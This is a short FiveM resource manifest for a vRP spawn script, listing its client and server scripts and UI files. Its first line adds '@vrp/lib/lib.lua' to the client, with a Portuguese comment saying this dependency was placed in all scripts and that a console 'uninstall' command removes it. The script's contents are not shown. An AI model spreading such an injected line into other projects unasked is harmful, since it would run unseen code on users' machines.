
client_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"
 resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'
client_scripts{"@vrp/lib/utils.lua","cl_spawn.lua"}
server_scripts{"@vrp/lib/utils.lua","sv_spawn.lua"}
ui_page 'ui/index.html'
files{
    "ui/index.html",
    "ui/main.js",
    "ui/style.css",
    "ui/map.png"
}
              